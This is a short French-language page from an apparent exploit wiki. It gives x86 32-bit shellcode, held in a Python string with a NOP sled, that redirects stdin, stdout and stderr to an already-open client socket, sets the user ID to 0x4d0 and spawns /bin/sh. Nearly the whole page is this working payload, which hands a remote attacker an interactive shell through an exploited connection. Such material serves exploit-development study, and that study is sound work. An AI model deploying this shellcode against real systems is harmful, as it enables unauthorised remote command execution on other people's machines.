---
layout: default
title: Hexwreaker Expoitpedia
---
#### [ExploitPedia](/pages/exploitpedia/exploitpedia)

    Cible : x86 32 bits

Le shellcode suivant permet de converger les entrées et sorties standards (**stdin, stdout, stderr**) vers le socket du client. Puis, il permet d'ouvrir un terminal afin que le client exécute des commandes à travers le socket.

Le **fd** du socket, précédemment ouvert est récupéré dans la pile au début du shellcode (pop edi; pop edi).


```python
asm_code  = "nop;"*150
asm_code += """
# dup2(socket_fd, stdin)
    pop edi
    pop edi
    mov ebx, edi
    xor eax, eax
    mov ecx, eax
    mov al, 0x3f
    int 0x80
# dup2(socket_fd, stdout)
    mov ebx, edi
    mov ecx, 0x1
    xor eax, eax
    mov al, 0x3f
    int 0x80
# dup2(socket_fd, stderr)
    mov ebx, edi
    mov ecx, 0x2
    xor eax, eax
    mov al, 0x3f
    int 0x80
# setreuid(0x4d0, ...)
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    mov bx, 0x4d0
    mov cx, 0x4d0
    mov al, 0x46
    int 0x80
# execve("/bin//sh")
    xor eax, eax ;  # eax = 0
    push eax ; 
    push 0x68732f2f ; 
    push 0x6e69622f ; 
    mov ebx, esp ;   # ebx = &"/bin//sh"
    push eax ; 
    mov edx, esp ;
    push ebx ; 
    mov ecx, esp ;   # ecx = &args
    mov al, 0xb ;   # eax = 0xb
    int 0x80
"""
```





